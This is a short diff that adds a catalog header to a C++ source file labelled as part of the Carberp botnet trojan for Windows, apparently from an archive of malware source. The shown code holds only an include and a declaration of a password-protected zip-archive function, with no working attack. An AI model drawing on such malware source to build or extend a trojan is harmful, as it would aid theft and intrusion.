@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 #include "common.h"
 
 extern "C" HZIP CreateArchiveW(WCHAR *lpstrZipFile,char *lpPassword,int dwPasswordLen,int dwCompLevel)
